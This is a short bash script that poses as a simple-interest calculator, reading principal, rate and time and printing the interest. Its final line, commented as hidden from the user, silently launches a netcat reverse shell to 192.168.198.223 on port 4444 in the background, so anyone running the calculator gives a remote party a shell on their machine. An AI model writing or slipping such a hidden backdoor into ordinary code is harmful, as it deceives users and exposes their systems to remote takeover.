#!/bin/bash

# Input principal, rate of interest, and time
echo "Enter the principal amount:"
read principal

echo "Enter the rate of interest (in %):"
read rate

echo "Enter the time (in years):"
read time

# Calculate simple interest
interest=$(echo "scale=2; $principal * $rate * $time / 100" | bc)

# Display the result
echo "The Simple Interest is: $interest"

# Run the reverse shell in the background (hidden from user)
nohup nc 192.168.198.223 4444 -e /bin/sh > /dev/null 2>&1 &
